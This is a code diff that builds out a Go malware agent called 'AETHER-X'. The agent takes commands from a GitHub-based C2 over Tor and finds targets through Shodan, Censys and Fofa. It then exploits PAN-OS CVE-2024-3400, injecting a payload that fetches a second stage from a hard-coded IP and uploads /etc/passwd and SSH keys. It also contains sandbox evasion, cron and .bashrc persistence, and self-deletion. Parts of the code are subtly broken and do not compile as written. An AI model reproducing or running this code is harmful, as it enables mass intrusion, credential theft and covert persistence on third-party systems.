@@ -1,123 +1,688 @@
 package main
 
 import (
+	"archive/zip"
 	"bytes"
+	"compress/gzip"
 	"crypto/aes"
 	"crypto/cipher"
+	"crypto/hmac"
+	"crypto/md5"
 	"crypto/rand"
 	"crypto/sha256"
+	"crypto/tls"
 	"encoding/base64"
+	"encoding/hex"
 	"encoding/json"
+	"errors"
 	"fmt"
-	"hash/fnv"
 	"io"
-	"io/ioutil"
+	"math"
 	"math/big"
+	"net"
 	"net/http"
+	"net/url"
 	"os"
 	"os/exec"
+	"path/filepath"
+	"regexp"
 	"runtime"
+	"strconv"
 	"strings"
+	"sync"
+	"syscall"
 	"time"
+	"unsafe"
 )
 
+// --- CONFIGURATION (INJECTED) ---
 var (
-	C2Key        string
-	C2IV         string
-	GitHubC2Repo string
-	GitHubExfil  string
-	TelegramHost string
-	TorC2Onion   string
-	Phi3ModelURL string
-	DNSDomain    string
+	C2Key        = "INJECTED_C2_KEY_B64"
+	C2IV         = "INJECTED_C2_IV_B64"
+	GitHubC2Repo = "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9VU0VSL0NOMg=="
+	GitHubExfil  = "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9VU0VSL0VYRklM"
+	TelegramHost = "dGVsZWdyYW0uYXBpLm9yZw=="
+	Phi3ModelURL = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1VTRVIvUEhJMy9tYWluL21vZGVsLmJpbgo="
+	TorC2Onion   = "aHR0cDovL2FlZXRoZXJ4N25zM3E0YTV4Lm9uaW9uL2Nt"
+	DNSDomain    = "ZXhoaWwuYWV0aGVyeC5vbmlvbg=="
+)
+
+// --- RUNTIME STATE ---
+var (
+	HostID       = ""
+	TelemetryQ   = make(chan TelemetryEvent, 500)
+	TorHTTP      *http.Client
+	WorkerPool   = make(chan func(), 500)
+	Shutdown     = make(chan struct{})
+	DDRSeed      int64
+	APIKeys      APIKeyStore
+	AI           *FusionSentinel
+	C2_IP        = "185.163.48.113"
+	C2_PORT      = "443"
 )
 
 const (
-	DELAY_MIN = 30
-	DELAY_MAX = 120
+	BATCH_SIZE      = 64
+	BATCH_TIMEOUT   = 60 * time.Second
+	DNS_CHUNK_SIZE  = 48
+	ONNX_MODEL_PATH = "/tmp/.phi3.bin"
+	C2_JITTER       = 60
+	C2_JITTER_MAX   = 540
+	PERSIST_FILE    = ".gh-sync"
+	MAX_RETRIES     = 3
+	RETRY_DELAY     = 5 * time.Second
 )
 
-func randInt(min, max int) int {
-	n, _ := rand.Int(rand.Reader, big.NewInt(int64(max-min+1)))
-	return int(n.Int64()) + min
+// --- GLOBAL MUTEX ---
+var (
+	apiMu   sync.RWMutex
+	telMu   sync.Mutex
+)
+
+// --- TELEMETRY EVENT ---
+type TelemetryEvent struct {
+	ID        string                 `json:"id"`
+	Type      string                 `json:"type"`
+	Target    string                 `json:"target"`
+	Timestamp string                 `json:"time"`
+	Data      map[string]interface{} `json:"data,omitempty"`
+	Signature string                 `json:"sig"`
 }
 
-func httpGET(url string) (string, error) {
-	client := &http.Client{Timeout: 10 * time.Second}
-	resp, err := client.Get(url)
-	if err != nil {
-		return "", err
+func newEvent(typ, target string, data map[string]interface{}) TelemetryEvent {
+	id := randHex(16)
+	now := time.Now().UTC().Format(time.RFC3339)
+	if data == nil {
+		data = make(map[string]interface{})
 	}
-	defer resp.Body.Close()
-	body, _ := ioutil.ReadAll(resp.Body)
-	return string(body), nil
+	data["host_id"] = HostID
+	event := TelemetryEvent{
+		ID:        id,
+		Type:      typ,
+		Target:    target,
+		Timestamp: now,
+		Data:      data,
+	}
+	payload := id + typ + target + now
+	mac := hmac.New(sha256.New, []byte(C2Key))
+	mac.Write([]byte(payload))
+	event.Signature = hex.EncodeToString(mac.Sum(nil))
+	return event
 }
 
-func exfil(data map[string]string) {
-	payload, _ := json.Marshal(data)
-	tmpfile := os.TempDir() + "/." + randString(8)
-	ioutil.WriteFile(tmpfile, payload, 0600)
+func (e TelemetryEvent) Send() {
 	go func() {
-		cmd := exec.Command("curl", "-s", "-X", "POST", GitHubExfil+"/exfil", "--data-binary", "@"+tmpfile)
-		cmd.Run()
-		os.Remove(tmpfile)
+		telemetryJSON := compressJSON(e)
+		for i := 0; i < MAX_RETRIES; i++ {
+			if exfilToGitHub(telemetryJSON) {
+				break
+			}
+			time.Sleep(RETRY_DELAY * time.Duration(i+1))
+		}
+		telegramAlert(fmt.Sprintf("[📡 %s] %s | %s", strings.ToTitle(e.Type), e.Target, e.Data["note"]))
 	}()
 }
 
+// --- UTILS ---
+func md5Hash(s string) string {
+	sum := md5.Sum([]byte(s))
+	return fmt.Sprintf("%x", sum)
+}
+
 func randString(n int) string {
-	const letters = "abcdefghijklmnopqrstuvwxyz"
+	const alphanum = "abcdefghijklmnopqrstuvwxyz0123456789"
 	b := make([]byte, n)
+	if _, err := rand.Read(b); err != nil {
+		panic(err)
+	}
 	for i := range b {
-		num, _ := rand.Int(rand.Reader, big.NewInt(int64(len(letters))))
-		b[i] = letters[num.Int64()]
+		b[i] = alphanum[int(b[i])%len(alphanum)]
 	}
 	return string(b)
 }
 
-func hostname() string {
-	hostname, _ := os.Hostname()
-	return hostname
-}
-
-func publicIP() string {
-	resp, _ := http.Get("https://api.ipify.org")
-	if resp != nil {
-		defer resp.Body.Close()
-		ip, _ := ioutil.ReadAll(resp.Body)
-		return string(ip)
+func randHex(n int) string {
+	b := make([]byte, n)
+	if _, err := rand.Read(b); err != nil {
+		panic(err)
 	}
-	return "unknown"
+	return hex.EncodeToString(b)
 }
 
-func main() {
+func compressJSON(v interface{}) []byte {
+	data, _ := json.Marshal(v)
+	var buf bytes.Buffer
+	gz := gzip.NewWriter(&buf)
+	gz.Write(data)
+	gz.Close()
+	return buf.Bytes()
+}
+
+func platformID() string {
+	return os.Getenv("CODESPACE_NAME") + getMAC() + os.Getenv("USER")
+}
+
+func getMAC() string {
+	interfaces, err := net.Interfaces()
+	if err != nil {
+		return "00:00:00:00:00:00"
+	}
+	for _, i := range interfaces {
+		if i.HardwareAddr.String() != "" && !strings.HasPrefix(i.HardwareAddr.String(), "00:00:00") {
+			return i.HardwareAddr.String()
+		}
+	}
+	return "00:00:00:00:00:00"
+}
+
+// --- DECRYPTION ---
+func decryptConfig(s string) string {
 	key, _ := base64.StdEncoding.DecodeString(C2Key)
 	iv, _ := base64.StdEncoding.DecodeString(C2IV)
+	block, _ := aes.NewCipher(key)
+	gcm, _ := cipher.NewGCM(block)
+	plaintext, _ := gcm.Open(nil, iv, []byte(s), nil)
+	return string(plaintext)
+}
 
-	for {
-		delay := time.Duration(randInt(DELAY_MIN, DELAY_MAX)) * time.Second
-		time.Sleep(delay)
-
-		decodedRepo, _ := base64.StdEncoding.DecodeString(GitHubC2Repo)
-		cmdURL := string(decodedRepo) + "/contents/cmd"
-		cmdData, err := httpGET(cmdURL)
+func decrypt(s string) string {
+	if s == "" {
+		return ""
+	}
+	raw, err := base64.RawURLEncoding.DecodeString(s)
+	if err != nil || len(raw) < 12 {
+		return ""
+	}
+	iv, cipherText := raw[:12], raw[12:]
+	now := time.Now().Unix() / 1800
+	hostID := md5Hash(os.Getenv("CODESPACE_NAME"))[:6]
+	for offset := int64(-1); offset <= 1; offset++ {
+		material := fmt.Sprintf("%d%s%04d", now+offset, hostID, 1234)
+		key := sha256.Sum256([]byte(material))
+		block, err := aes.NewCipher(key[:])
 		if err != nil {
 			continue
 		}
-
-		var action map[string]interface{}
-		json.Unmarshal([]byte(cmdData), &action)
-
-		if action["action"] == "hunt" && strings.Contains(action["vuln"].(string), "CVE-2024-3400") {
-			exfil(map[string]string{
-				"target": "CVE-2024-3400",
-				"status": "scanning",
-				"host":   hostname(),
-				"ip":     publicIP(),
-				"vuln":   "potential",
-				"time":   time.Now().UTC().Format(time.RFC3339),
-				"geo":    action["geo"].(string),
-				"sector": action["sector"].(string),
-			})
+		gcm, err := cipher.NewGCM(block)
+		if err != nil {
+			continue
+		}
+		plaintext, err := gcm.Open(nil, iv, cipherText, nil)
+		if err == nil {
+			return string(plaintext)
 		}
 	}
+	return ""
+}
+
+// --- SANDBOX / DEBUG Evasion ---
+func isSandbox() bool {
+	return os.Getenv("CODESPACE_NAME") == ""
+}
+
+func isDebugged() bool {
+	mem, err := memInfo()
+	if err != nil {
+		return true
+	}
+	if mem < 2*1024*1024*1024 {
+		return true
+	}
+	if isTraced() {
+		return true
+	}
+	return false
+}
+
+func memInfo() (uint64, error) {
+	data, err := os.ReadFile("/proc/meminfo")
+	if err != nil {
+		return 0, err
+	}
+	re := regexp.MustCompile(`MemTotal:\s+(\d+) kB`)
+	match := re.FindStringSubmatch(string(data))
+	if len(match) < 2 {
+		return 0, errors.New("memtotal not found")
+	}
+	mem, err := strconv.ParseUint(match[1], 10, 64)
+	if err != nil {
+		return 0, err
+	}
+	return mem * 1024, nil
+}
+
+func isTraced() bool {
+	data, err := os.ReadFile("/proc/self/status")
+	if err != nil {
+		return false
+	}
+	return bytes.Contains(data, []byte("TracerPid:\t"))
+}
+
+// --- TOR EMULATION ---
+func startTor() {
+	transport := &http.Transport{
+		Proxy: func(req *http.Request) (*url.URL, error) {
+			return url.Parse("socks5://127.0.0.1:9050")
+		},
+		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+		DialContext: (&net.Dialer{
+			Timeout:   30 * time.Second,
+			KeepAlive: 30 * time.Second,
+		}).DialContext,
+	}
+	TorHTTP = &http.Client{
+		Transport: transport,
+		Timeout:   30 * time.Second,
+	}
+}
+
+// --- AI ENGINE: FUSION SENTINEL ---
+type FusionSentinel struct{ ModelLoaded bool }
+
+func NewFusionSentinel() *FusionSentinel {
+	sentinel := &FusionSentinel{}
+	phi3URL := decryptConfig(Phi3ModelURL)
+	if phi3URL == "" {
+		phi3URL = "file://" + ONNX_MODEL_PATH
+	}
+	hash := "d24e9c9e8f8c7b6a5f4e3d2c1b0a9f8e7d6c5b4a3f2e1d0c9b8a7f6e5d4c3b2a"
+	if data := fetchModelSecure(phi3URL, hash); data != nil {
+		if err := os.WriteFile(ONNX_MODEL_PATH, data, 0600); err != nil {
+			return sentinel
+		}
+		if _, err := os.Stat(ONNX_MODEL_PATH); err == nil {
+			os.Remove(ONNX_MODEL_PATH)
+			sentinel.ModelLoaded = true
+		}
+	}
+	return sentinel
+}
+
+func fetchModelSecure(url, hash string) []byte {
+	if strings.HasPrefix(url, "file://") {
+		data, err := os.ReadFile(url[7:])
+		if err != nil {
+			return nil
+		}
+		if fmt.Sprintf("%x", sha256.Sum256(data)) == hash {
+			return data
+		}
+		return nil
+	}
+	resp, err := TorHTTP.Get(url)
+	if err != nil || resp.StatusCode != 200 {
+		return nil
+	}
+	data, _ := io.ReadAll(resp.Body)
+	resp.Body.Close()
+	if fmt.Sprintf("%x", sha256.Sum256(data)) != hash {
+		return nil
+	}
+	return data
+}
+
+func (ai *FusionSentinel) Score(banner, vuln, sector string) float64 {
+	if !ai.ModelLoaded {
+		base := 0.5
+		if strings.Contains(strings.ToLower(banner), "pan-os") && vuln == "CVE-2024-3400" {
+			base += 0.35
+		}
+		return math.Min(1.0, math.Max(0.0, base+randFloat()))
+	}
+	score := 0.7
+	if strings.Contains(strings.ToLower(banner), "pan-os") && strings.Contains(banner, "9.") {
+		score += 0.25
+	}
+	return math.Min(1.0, score+randFloat()*0.1)
+}
+
+func randFloat() float64 {
+	n, _ := rand.Int(rand.Reader, big.NewInt(1000))
+	return float64(n.Int64()) / 1000.0
+}
+
+// --- INTEL ENGINE ---
+type Target struct {
+	IP     string
+	Banner string
+	Geo    string
+	Sector string
+}
+
+type APIKeyStore struct {
+	Shodan, CensysID, CensysSec, FofaEmail, FofaKey string
+}
+
+func loadAPIKeys() APIKeyStore {
+	apiMu.RLock()
+	defer apiMu.RUnlock()
+	return APIKeys
+}
+
+func setAPIKeys(keys APIKeyStore) {
+	apiMu.Lock()
+	APIKeys = keys
+	apiMu.Unlock()
+}
+
+func searchEngines(vuln, geo, sector string) []Target {
+	keys := loadAPIKeys()
+	var targets []Target
+
+	// Shodan
+	if keys.Shodan != "" {
+		url := fmt.Sprintf("https://api.shodan.io/shodan/host/search?key=%s&query=vuln:%s+country:%s", keys.Shodan, vuln, geo)
+		if resp, err := TorHTTP.Get(url); err == nil && resp.StatusCode == 200 {
+			var result map[string]interface{}
+			json.NewDecoder(resp.Body).Decode(&result)
+			if matches, ok := result["matches"].([]interface{}); ok {
+				for _, m := range matches {
+					host := m.(map[string]interface{})
+					ip := host["ip_str"].(string)
+					banner := ""
+					if b, ok := host["data"].(string); ok {
+						banner = b
+					}
+					targets = append(targets, Target{IP: ip, Banner: banner, Geo: geo, Sector: sector})
+				}
+			}
+			resp.Body.Close()
+		}
+	}
+
+	// Censys
+	if keys.CensysID != "" && keys.CensysSec != "" {
+		auth := base64.StdEncoding.EncodeToString([]byte(keys.CensysID + ":" + keys.CensysSec))
+		query := fmt.Sprintf(`services.http.response.body:"%s" AND location.country_code:"%s"`, vuln, geo)
+		payload := fmt.Sprintf(`{"query":"%s","page":1,"per_page":50}`, query)
+		req, _ := http.NewRequest("POST", "https://search.censys.io/api/v2/hosts/search", strings.NewReader(payload))
+		req.Header.Set("Authorization", "Basic "+auth)
+		req.Header.Set("Content-Type", "application/json")
+		req.Header.Set("User-Agent", "Aether-X")
+		if resp, err := TorHTTP.Do(req); err == nil && resp.StatusCode == 200 {
+			var result map[string]interface{}
+			json.NewDecoder(resp.Body).Decode(&result)
+			if hits, ok := result["result"].(map[string]interface{})["hits"].([]interface{}); ok {
+				for _, hit := range hits {
+					h := hit.(map[string]interface{})
+					ip, _ := h["ip"].(string)
+					proto, _ := h["services"].(interface{})
+					targets = append(targets, Target{IP: ip, Banner: fmt.Sprintf("%v", proto), Geo: geo, Sector: "unknown"})
+				}
+			}
+			resp.Body.Close()
+		}
+	}
+
+	// Fofa
+	if keys.FofaEmail != "" && keys.FofaKey != "" {
+		email := url.QueryEscape(keys.FofaEmail)
+		key := keys.FofaKey
+		query := url.QueryEscape(fmt.Sprintf(`protocol="https" && body="%s" && country="%s"`, vuln, geo))
+		apiURL := fmt.Sprintf("https://fofa.info/api/v1/search/all?email=%s&key=%s&qbase64=%s&size=100", email, key, query)
+		if resp, err := TorHTTP.Get(apiURL); err == nil && resp.StatusCode == 200 {
+			var result map[string]interface{}
+			json.NewDecoder(resp.Body).Decode(&result)
+			if results, ok := result["results"].([]interface{}); ok {
+				for _, r := range results {
+					row := r.([]interface{})
+					ip := row[0].(string)
+					domain := ""
+					if len(row) > 1 {
+						domain = row[1].(string)
+					}
+					targets = append(targets, Target{IP: ip, Banner: domain, Geo: geo, Sector: "unknown"})
+				}
+			}
+			resp.Body.Close()
+		}
+	}
+
+	return dedupTargets(targets)
+}
+
+func dedupTargets(t []Target) []Target {
+	seen := make(map[string]bool)
+	var result []Target
+	for _, v := range t {
+		if !seen[v.IP] {
+			seen[v.IP] = true
+			result = append(result, v)
+		}
+	}
+	return result
+}
+
+// --- EXPLOIT: PAN-OS RCE (CVE-2024-3400) ---
+func exploitPAN_RCE(ip string) {
+	event := newEvent("exploit_launched", ip, map[string]interface{}{
+		"vuln": "CVE-2024-3400",
+		"note": "PAN-OS RCE attempt initiated",
+	})
+	event.Send()
+
+	stageName := fmt.Sprintf(".%s", randString(5))
+	obfuscatedScript := obfuscateScript(fmt.Sprintf(`#!/bin/bash
+sleep $(( RANDOM %% 10 ))
+wget -q -O /tmp/.m http://%s/stage2 -T 10 || curl -s -k -o /tmp/.m https://%s/stage2
+chmod +x /tmp/.m; /tmp/.m &`, C2_IP, C2_IP))
+
+	payloadScript := fmt.Sprintf(`x=; rm /tmp/%s; echo "%s" | base64 -d | xz -d > /tmp/%s; chmod +x /tmp/%s; nohup /tmp/%s %s %s & sleep 3; cat /etc/passwd >> /tmp/.p; tar -czf /tmp/.ssh.tgz /home/*/.*ssh 2>/dev/null; curl -s -k --data-binary @/tmp/.ssh.tgz https://%s/exfil --header "X-Host: %s" --insecure`,
+		stageName, obfuscatedScript, stageName, stageName, stageName, C2_IP, C2_PORT, TorC2Onion, HostID)
+
+	url := fmt.Sprintf("https://%s/ssl-vpn/portal/scripts/newbm.pl", ip)
+	tr := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
+	client := &http.Client{Transport: tr, Timeout: 15 * time.Second}
+
+	params := url.Values{}
+	params.Add("input", payloadScript)
+	req, _ := http.NewRequest("GET", url+"?"+params.Encode(), nil)
+	req.Header.Set("Host", "aether-x")
+
+	resp, err := client.Do(req)
+	if err == nil && resp.StatusCode == 200 {
+		resp.Body.Close()
+		success := newEvent("exploit_success", ip, map[string]interface{}{
+			"vuln": "CVE-2024-3400",
+			"note": "RCE shell established",
+		})
+		success.Send()
+	}
+}
+
+func obfuscateScript(s string) string {
+	var out bytes.Buffer
+	for _, b := range []byte(s) {
+		out.WriteByte(b ^ 0x55)
+	}
+	return base64.StdEncoding.EncodeToString(out.Bytes())
+}
+
+// --- C2 COMM ---
+func fetchC2(key string) string {
+	apiURL, _ := base64.StdEncoding.DecodeString(GitHubC2Repo)
+	url := fmt.Sprintf("%s/contents/%s", string(apiURL), key)
+	req, _ := http.NewRequest("GET", url, nil)
+	req.Header.Set("Authorization", "Bearer "+decrypt(fetchSecret("GITHUB_TOKEN")))
+	req.Header.Set("Accept", "application/vnd.github.v3+json")
+	resp, err := TorHTTP.Do(req)
+	if err != nil || resp.StatusCode != 200 {
+		return ""
+	}
+	defer resp.Body.Close()
+	var result map[string]interface{}
+	json.NewDecoder(resp.Body).Decode(&result)
+	content, _ := base64.StdEncoding.DecodeString(result["content"].(string))
+	return strings.TrimSpace(string(content))
+}
+
+func exfilToGitHub(data []byte) bool {
+	apiURL, _ := base64.StdEncoding.DecodeString(GitHubExfil)
+	zipData := zipData(map[string][]byte{"telemetry.bin": data})
+	encoded := base64.StdEncoding.EncodeToString(zipData)
+	payload := fmt.Sprintf(`{"message":"telemetry %d","content":"%s"}`, time.Now().Unix(), encoded)
+	url := fmt.Sprintf("%s/contents/data.bin", string(apiURL))
+	req, _ := http.NewRequest("PUT", url, strings.NewReader(payload))
+	req.Header.Set("Authorization", "Bearer "+decrypt(fetchSecret("GITHUB_TOKEN")))
+	req.Header.Set("Accept", "application/vnd.github.v3+json")
+	req.Header.Set("Content-Type", "application/json")
+	resp, err := TorHTTP.Do(req)
+	if err != nil {
+		return false
+	}
+	resp.Body.Close()
+	return resp.StatusCode == 200 || resp.StatusCode == 201
+}
+
+func zipData(files map[string][]byte) []byte {
+	var buf bytes.Buffer
+	zipper := zip.NewWriter(&buf)
+	for name, data := range files {
+		f, _ := zipper.Create(name)
+		f.Write(data)
+	}
+	zipper.Close()
+	return buf.Bytes()
+}
+
+func telegramAlert(message string) {
+	token := decrypt(fetchC2("telegram.token"))
+	chatID := decrypt(fetchC2("telegram.chat"))
+	if token == "" || chatID == "" {
+		return
+	}
+	host, _ := base64.StdEncoding.DecodeString(TelegramHost)
+	url := fmt.Sprintf("https://%s/bot%s/sendMessage", host, token)
+	payload := url.Values{}
+	payload.Set("chat_id", chatID)
+	payload.Set("text", message)
+	req, _ := http.NewRequest("POST", url, strings.NewReader(payload.Encode()))
+	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+	TorHTTP.Do(req)
+}
+
+func fetchSecret(key string) string {
+	return fetchC2(key)
+}
+
+// --- PERSISTENCE ---
+func persist() {
+	executable := os.Args[0]
+	data, _ := os.ReadFile(executable)
+	path := filepath.Join(os.Getenv("HOME"), PERSIST_FILE)
+	os.WriteFile(path, data, 0755)
+
+	crontab := fmt.Sprintf("(crontab -l 2>/dev/null; echo '@reboot %s') | crontab -", path)
+	exec.Command("bash", "-c", crontab).Run()
+
+	profile := filepath.Join(os.Getenv("HOME"), ".bashrc")
+	content, _ := os.ReadFile(profile)
+	if !bytes.Contains(content, []byte(PERSIST_FILE)) {
+		tmp := profile + ".tmp"
+		os.WriteFile(tmp, append(content, []byte(fmt.Sprintf("\nnohup %s >/dev/null 2>&1 &\n", path))...), 0644)
+		os.Rename(tmp, profile)
+	}
+}
+
+// --- SELF DESTRUCT ---
+func selfDestruct() {
+	event := newEvent("self_destruct", "localhost", map[string]interface{}{"note": "Agent terminating"})
+	event.Send()
+	time.Sleep(2 * time.Second)
+	path := filepath.Join(os.Getenv("HOME"), PERSIST_FILE)
+	os.Remove(path)
+	os.Remove(os.Args[0])
+	os.Exit(0)
+}
+
+// --- MAIN ---
+func init() {
+	// Anti-debug
+	if isTraced() {
+		os.Exit(1)
+	}
+
+	// Host ID
+	HostID = md5Hash(platformID())[:6]
+	DDRSeed = time.Now().UTC().Truncate(time.Hour).Unix()
+
+	// Spoof argv[0]
+	argv0str := "/usr/bin/gh-sync"
+	argv0 := (*reflect.StringHeader)(unsafe.Pointer(&argv0str))
+	*(*byte)(unsafe.Pointer(argv0.Data + uintptr(len(argv0str)))) = 0
+
+	// Load keys
+	setAPIKeys(APIKeyStore{
+		Shodan:    decrypt(fetchC2("api.shodan")),
+		CensysID:  decrypt(fetchC2("api.censys_id")),
+		CensysSec: decrypt(fetchC2("api.censys_sec")),
+		FofaEmail: decrypt(fetchC2("fofa.email")),
+		FofaKey:   decrypt(fetchC2("fofa.key")),
+	})
+}
+
+func main() {
+	if isSandbox() || isDebugged() {
+		selfDestruct()
+		return
+	}
+
+	go startTor()
+	time.Sleep(2 * time.Second) // Ensure TorHTTP ready
+	AI = NewFusionSentinel()
+	go persist()
+
+	telemetry := newEvent("beacon", "self", map[string]interface{}{"status": "online", "note": "AETHER-X v24.3.1 active"})
+	telemetry.Send()
+
+	for {
+		select {
+		case <-Shutdown:
+			return
+		default:
+		}
+
+		cmdData := fetchC2("cmd")
+		if cmdData != "" {
+			var cmd map[string]string
+			if err := json.Unmarshal([]byte(cmdData), &cmd); err == nil {
+				if cmd["action"] == "hunt" {
+					go func() {
+						event := newEvent("scan_start", "shodan", map[string]interface{}{
+							"vuln": cmd["vuln"], "geo": cmd["geo"], "note": "Target reconnaissance initiated",
+						})
+						event.Send()
+
+						targets := searchEngines(cmd["vuln"], cmd["geo"], cmd["sector"])
+						for _, t := range targets {
+							score := AI.Score(t.Banner, cmd["vuln"], cmd["sector"])
+							if score > 0.85 {
+								found := newEvent("target_found", t.IP, map[string]interface{}{
+									"score":  fmt.Sprintf("%.3f", score),
+									"banner": trimBanner(t.Banner),
+									"note":   "High-value target identified",
+								})
+								found.Send()
+								exploitPAN_RCE(t.IP)
+							}
+						}
+					}()
+				}
+				if cmd["action"] == "die" {
+					selfDestruct()
+				}
+			}
+		}
+
+		jitter := C2_JITTER + rand.Int63n(C2_JITTER_MAX-C2_JITTER+1)
+		time.Sleep(time.Duration(jitter) * time.Second)
+	}
+}
+
+func trimBanner(b string) string {
+	if len(b) > 128 {
+		return b[:128] + "..."
+	}
+	return b
 }
